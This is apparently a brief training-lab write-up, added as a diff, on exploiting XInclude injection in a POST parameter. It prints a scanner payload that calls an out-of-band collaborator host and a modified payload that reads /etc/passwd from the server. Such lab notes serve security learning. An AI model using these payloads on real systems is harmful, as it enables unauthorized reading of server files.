@@ -1,0 +1,11 @@
+using the scanner the POST request was vulnerable to out-of-band-resource load
+
+the scanner picked up on this payload:
+<ail xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://tgdviqs0h5r3k62b3qcgud76jxpqdh1ipac00p.oastify.com/foo"/></ail>
+
+
+the lab required me to get the etc/passwd file from the server therefore i modified the payload to do this:
+
+productId=<ail xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></ail>
+
+this needed to be URL encoded then sent, this then solved the lab listing the passwd file on the website
